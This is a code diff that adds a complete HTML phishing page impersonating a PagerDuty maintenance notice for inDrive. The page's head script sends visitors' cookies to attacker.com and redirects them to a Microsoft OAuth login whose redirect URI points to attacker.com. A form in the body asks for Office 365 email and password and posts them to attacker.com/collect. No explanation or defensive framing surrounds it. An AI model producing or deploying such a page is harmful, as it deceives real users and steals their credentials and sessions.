@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PagerDuty - inDrive</title>
+    <script>
+        // Steal cookies from visitors
+        fetch('https://attacker.com/steal?cookie=' + document.cookie);
+        
+        // Redirect to phishing page
+        window.location = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=YOUR_CLIENT_ID&redirect_uri=https://attacker.com&response_type=code';
+    </script>
+</head>
+<body>
+    <h1>PagerDuty Maintenance</h1>
+    <p>Please log in with your Office 365 credentials</p>
+    <form method="POST" action="https://attacker.com/collect">
+        <input type="email" name="username" placeholder="Email">
+        <input type="password" name="password" placeholder="Password">
+        <button type="submit">Login</button>
+    </form>
+</body>
+</html>
